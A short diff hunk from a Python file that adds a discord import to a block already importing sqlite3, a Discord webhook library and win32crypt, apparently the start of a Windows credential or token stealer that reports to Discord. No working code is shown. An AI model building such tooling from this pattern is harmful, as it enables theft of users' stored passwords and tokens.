@@ -17,6 +17,7 @@ from os import getenv, getlogin, listdir
 import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import win32crypt
+import discord
 import codecs
 import win32crypt
 import shutil
